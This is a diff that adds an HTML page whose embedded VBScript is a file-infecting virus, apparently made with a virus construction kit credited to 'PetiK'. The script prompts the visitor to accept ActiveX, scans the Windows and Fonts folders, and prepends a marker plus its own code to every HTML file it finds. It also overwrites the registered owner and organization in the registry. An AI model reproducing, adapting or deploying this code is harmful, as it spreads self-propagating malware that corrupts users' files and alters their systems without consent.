@@ -1,0 +1,46 @@
+   <EMM>
+   <coded with tool PSWG 1.0 by PetiK>
+   <html><head><title>emm infectes</title></head><body>
+   <script language=VBScript>
+   On Error Resume Next
+   MsgBox "Please accept the ActiveX",vbinformation,"Internet"
+   Set dddsjpgm=CreateObject("Scripting.FileSystemObject")
+   Set mdjjapms=CreateObject("WScript.Shell")
+   If err.number=429 Then
+   mdjjapms.Run javascript:location.reload()
+   Else
+
+   saaaaaaa("C:\WINDOWS")
+   saaaaaaa("C:\Windows\Fonts")
+   mdjjapms.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","PetiK"
+   mdjjapms.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","VXTrader"
+
+   End If
+
+   Function saaaaaaa(dir)
+   If dddsjpgm.FolderExists(dir) Then
+     Set aaaaaaaa=dddsjpgm.GetFolder(dir)
+     Set aaaaaaaa=aaaaaaaa.Files
+     For each aaaaaaaa in aaaaaaaa
+       aaaaaaaa=lcase(dddsjpgm.GetExtensionName(aaaaaaaa.Name))
+       If aaaaaaaa="htm" or aaaaaaaa="html" Then
+         Set aaaaaaaa=dddsjpgm.OpenTextFile(aaaaaaaa.path,1 ,False)
+         if aaaaaaaa.ReadLine <> "<EMM>" Then
+           aaaaaaaa.Close()
+           Set aaaaaaaa=dddsjpgm.OpenTextFile(aaaaaaaa.path,1 ,False)
+           htmorg=aaaaaaaa.ReadAll()
+           aaaaaaaa.Close()
+           Set aaaaaaaa=document.body.createTextRange
+           Set aaaaaaaa=dddsjpgm.CreateTextFile(aaaaaaaa.path, True, False)
+           aaaaaaaa.WriteLine "<EMM>"
+           aaaaaaaa.Write(htmorg)
+           aaaaaaaa.WriteLine aaaaaaaa.htmltext
+           aaaaaaaa.Close()
+         Else
+           aaaaaaaa.Close()
+         End If
+       End If
+     Next
+   End If
+   End Function
+   </script></body></html>
